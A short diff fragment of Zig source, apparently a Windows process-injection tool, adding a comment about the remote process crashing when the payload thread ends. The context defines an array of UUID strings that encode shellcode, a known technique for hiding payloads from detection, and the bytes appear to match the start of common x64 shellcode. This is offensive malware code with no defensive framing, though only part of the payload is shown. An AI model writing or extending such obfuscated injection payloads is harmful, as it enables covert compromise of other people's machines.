@@ -6,6 +6,7 @@ const code_injection = sec.code_injection;
 
 const CloseHandle = std.os.windows.CloseHandle;
 
+// The remote process crashes when the execution of the payload thread ends.
 const uuid_array = [_][:0]const u8{
     "E48348FC-E8F0-00C0-0000-415141505251",
     "D2314856-4865-528B-6048-8B5218488B52",
